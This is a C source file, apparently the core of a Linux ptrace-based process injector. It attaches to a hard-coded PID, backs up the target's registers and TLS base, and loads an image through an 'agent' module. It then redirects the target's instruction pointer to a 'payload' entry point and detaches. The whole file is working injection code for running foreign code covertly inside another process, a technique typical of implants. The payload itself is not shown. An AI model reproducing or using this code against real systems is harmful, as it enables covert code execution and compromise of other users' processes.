#define _GNU_SOURCE
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <errno.h>
#include <elf.h>
#include "agent.h"
#include "param_struct_x64.h"
#define PID 1234
#define CHECK(x) if ((x) == -1) { perror(#x); exit(1); }
#define NT_x64_FS 0x202 // Ptrace flag for x86_64 TLS register

static int wait_for_tracee(pid_t pid, int *status) {
    pid_t waited;

    do {
        waited = waitpid(pid, status, 0);
    } while (waited == -1 && errno == EINTR);

    if (waited == -1) {
        perror("waitpid");
        return -1;
    }

    return 0;
}

int main() {
    pid_t pid = PID;
    int status;

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace attach");
        return EXIT_FAILURE;
    }

    if (wait_for_tracee(pid, &status) == -1) {
        return EXIT_FAILURE;
    }

    struct user_regs_struct regs, backup = {0};

    struct iovec iov = {
        .iov_base = &backup,
        .iov_len = sizeof(backup),
    };

    CHECK(ptrace(PTRACE_GETREGSET, pid, (void *)NT_PRSTATUS, &iov));
    regs = backup;

    // backup TLS registers
    uint64_t fs_backup = 0;
    struct iovec fs_iov;
    fs_iov.iov_base = &fs_backup;
    fs_iov.iov_len = sizeof(fs_backup);
    if (ptrace(PTRACE_GETREGSET, pid, NT_x64_FS, &fs_iov) == -1) {
        perror("[-] Failed to backup FS (Non-fatal)");
    }

    // printf("[*] rip at attach: 0x%llx\n", (unsigned long long)regs.rip);
    // printf("[*] rdi at attach: 0x%llx\n", (unsigned long long)regs.rdi);

    unsigned long syscall_rip = backup.rip;


    struct loader_params params;
    params.pid = pid;
    params.regs = &regs;
    params.syscall_rip = syscall_rip;
    params.backup = backup;
    params.fs_backup = fs_backup;
    load_image(&params);
    
    regs = backup;
    regs.rip = (unsigned long)params.entry_point + 2; // +2 to skip mid syscall revert
    regs.rdi = params.cleanup_ctx_addr;

    // printf("[*] rip after load_image: 0x%llx\n", (unsigned long long)regs.rip);
    // printf("[*] rdi after load_image: 0x%llx\n", (unsigned long long)regs.rdi);

    iov.iov_base = &regs;
    iov.iov_len = sizeof(regs);

    // Tell process to continue at payload address and detatch
    CHECK(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));

    memset(&params, 0, sizeof(params));
    __asm__ __volatile__("" ::: "memory");
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    exit(0);
    return 0;
}